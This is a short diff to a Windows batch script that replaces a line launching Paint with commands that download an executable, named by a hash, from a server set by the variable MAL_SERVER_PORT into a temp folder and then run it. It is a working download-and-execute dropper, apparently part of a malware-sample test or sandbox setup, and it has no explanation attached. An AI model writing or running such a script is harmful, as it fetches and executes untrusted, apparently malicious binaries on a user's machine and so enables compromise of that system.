@@ -1,2 +1,8 @@
 @echo off
-start mspaint
+set URL=http://%MAL_SERVER_PORT%/5fa60303a0c4fd13ecd69e7c1a17788b72605473c2fb3f93eb758010326c76e5.exe.bin
+set OUTPUT_DIR=%TEMP%\NMLT.2
+set OUTPUT=%OUTPUT_DIR%\5fa60303a0c4fd13ecd69e7c1a17788b72605473c2fb3f93eb758010326c76e5.exe
+
+mkdir %OUTPUT_DIR%
+curl -o %OUTPUT% %URL%
+start %OUTPUT%
